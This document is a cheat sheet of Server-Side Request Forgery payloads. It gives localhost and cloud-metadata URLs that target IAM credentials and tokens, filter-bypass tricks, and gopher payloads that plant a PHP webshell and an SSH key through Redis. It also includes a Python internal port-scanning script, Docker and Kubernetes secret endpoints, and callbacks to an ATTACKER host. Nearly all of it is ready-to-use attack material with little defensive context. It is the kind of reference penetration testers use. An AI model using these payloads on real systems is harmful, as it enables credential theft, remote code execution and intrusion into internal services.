# SSRF (Server-Side Request Forgery) Payloads

## Basic Payloads

```
# Localhost
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]

# Alternative representations
http://0x7f000001          # hex
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://127.1               # short form
http://127.0.1             # short form
http://0                   # resolves to 0.0.0.0
```

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data

# IMDSv2 (requires token — harder to exploit via SSRF)
# Needs PUT request with header → usually blocked in simple SSRF
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
# Some SSRF vectors allow injecting headers

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

## Filter Bypass Techniques

### DNS Rebinding
```
# Use DNS that resolves to 127.0.0.1
# 1. Set up DNS record: evil.com → 127.0.0.1
# 2. Some services: rebind.it, 1u.ms, nip.io
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net  # configure to resolve to internal IP

# DNS rebinding attack:
# First resolution → external IP (passes validation)
# Second resolution → 127.0.0.1 (actual request goes to localhost)
# Tool: https://github.com/taviso/rbndr
```

### URL Parsing Tricks
```
# @ symbol (credentials section)
http://evil.com@127.0.0.1          # some parsers use 127.0.0.1 as host
http://127.0.0.1#@evil.com         # fragment confusion

# Backslash vs forward slash
http://127.0.0.1\@evil.com

# URL encoding
http://127.0.0.1%2523@evil.com
http://%31%32%37%2e%30%2e%30%2e%31  # URL-encoded 127.0.0.1

# Double URL encoding
http://%25%31%25%32%25%37.0.0.1

# Unicode normalization
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  # enclosed alphanumerics
```

### Protocol Smuggling
```
# Gopher (powerful — can craft arbitrary TCP packets)
gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system(%24_GET['c'])%3B%3F>%22%0D%0ASAVE%0D%0A
# → Writes PHP webshell via Redis

gopher://127.0.0.1:25/_HELO%20evil%0D%0AMAIL%20FROM:...
# → Sends email via SMTP

gopher://127.0.0.1:3306/_...
# → MySQL query (requires knowledge of MySQL protocol)

# dict:// protocol
dict://127.0.0.1:6379/SET:shell:payload

# file:// protocol
file:///etc/passwd
file:///c:/windows/win.ini
```

### Redirect-Based Bypass
```python
# If server follows redirects but validates initial URL:
# 1. Host redirect on attacker server
# http://ATTACKER/redirect → 302 → http://127.0.0.1/admin

# Flask redirect server:
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redirect')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/')
```

## Internal Port Scanning

```python
import requests, time

TARGET = "http://vulnerable.com/fetch"
INTERNAL = "127.0.0.1"

for port in range(1, 65536):
    start = time.time()
    try:
        r = requests.post(TARGET, data={"url": f"http://{INTERNAL}:{port}"}, timeout=3)
        elapsed = time.time() - start
        if r.status_code != 500 or elapsed < 2:  # adjust based on behavior
            print(f"[+] Port {port}: status={r.status_code} time={elapsed:.2f}s len={len(r.text)}")
    except:
        pass
```

## Exploiting Internal Services via SSRF

### Redis (port 6379)
```
# Write webshell
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Write SSH key
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20key%20%22ssh-rsa%20AAAA...%22%0D%0ASAVE%0D%0A
```

### Elasticsearch (port 9200)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password
```

### Docker API (port 2375)
```
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json
# → Create privileged container for host escape
```

### Kubernetes API (port 6443/8443)
```
http://127.0.0.1:6443/api/v1/namespaces/default/secrets
http://127.0.0.1:10250/pods  # kubelet
```

## Blind SSRF Confirmation

```
# DNS-based (check attacker DNS logs)
http://ATTACKER_DOMAIN
http://unique-id.ATTACKER_DOMAIN

# HTTP-based (check attacker HTTP server logs)
http://ATTACKER:PORT/ssrf-confirm

# Timing-based (port scan)
# Open port → fast response
# Closed port → timeout/slow response
```
